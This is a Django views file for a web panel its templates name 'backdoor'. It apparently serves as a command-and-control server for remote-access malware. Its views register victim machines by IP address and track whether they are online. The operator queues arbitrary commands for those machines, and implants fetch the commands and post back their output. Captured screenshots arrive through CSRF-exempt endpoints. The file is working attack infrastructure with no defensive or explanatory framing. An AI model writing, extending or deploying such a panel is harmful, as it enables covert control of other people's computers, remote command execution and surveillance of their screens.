from django.shortcuts import render, redirect
from django.http import JsonResponse, HttpResponse
from .models import Output, Computer, Command, Files
from .forms import CodeForm, ScreenShotForm, OutputForm
from datetime import timedelta
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt


def home(request):
    context = {
        'computers': Computer.objects.all()
    }
    return render(request, "backdoor/home.html", context)

def computer_detail(request, pc_id):
    computer = Computer.objects.all().filter(id=pc_id)[0]
    form = CodeForm(request.POST)
    if request.method == 'POST':
        if form.is_valid():
            code = form.cleaned_data['code']
            Command(command=code, target=computer).save()
            print(code)
        else:
            form = CodeForm()


    return render(request, "backdoor/pc_detail.html", {'pc':computer, 'form':form})

def ajax(request, pk):
    data = ""
    computer = Computer.objects.all().filter(id=pk)[0]
    for output in Output.objects.all().filter(target=computer):
        data += output.output
    return JsonResponse({'data':data})

def check_pc_online(request, pk):
    computer = Computer.objects.all().filter(id=pk)[0]
    within_3_seconds = timezone.now() - timedelta(seconds=10)
    if within_3_seconds > computer.last_online:
        return JsonResponse({"data":"offline"})
    else:
        return JsonResponse({"data":"online"}) 

def clean(request, pk):
    computer = Computer.objects.all().filter(id=pk)[0]
    Output.objects.filter(target=computer).delete()
    return redirect("computer-detail", pk)

@csrf_exempt
def screenshot(request):
    if request.method == 'POST':
        form = ScreenShotForm(request.POST, request.FILES)
        if form.is_valid():
            image = request.FILES['file']
            Files.objects.create(file=image)
    else:
        form = ScreenShotForm()
    
    return render(request, "backdoor/screenshot.html", {'form':form})

def get_id(request, ip):
    try:
        computer = Computer.objects.get(ip_addr=ip)
    except:
        computer = Computer.objects.create(ip_addr=ip)
    return JsonResponse({'id':computer.id})
def ping(request, pk):
    computer = Computer.objects.get(id=pk)
    computer.last_online = timezone.now()
    computer.save()
    return JsonResponse({})
    
def commands(request, pk):
    computer = Computer.objects.get(id=pk)
    commands_dict = {}
    commands = Command.objects.all().filter(target=computer)
    for i in commands:
        commands_dict[i.id] = i.command
    return JsonResponse(commands_dict)

@csrf_exempt
def output(request, pk, command_id):
    computer = Computer.objects.get(id=pk)
    command = Command.objects.get(id=command_id)
    if request.method == 'POST':
        form = OutputForm(request.POST)
        if form.is_valid():
            output = form.cleaned_data['output']
            Output.objects.create(target=computer,
                                  output=output,
                                  command=command.command,
                                  time=timezone.now())
            command.delete()
    else:
        form = OutputForm()
    
    return render(request, "backdoor/output.html", {'form':form})

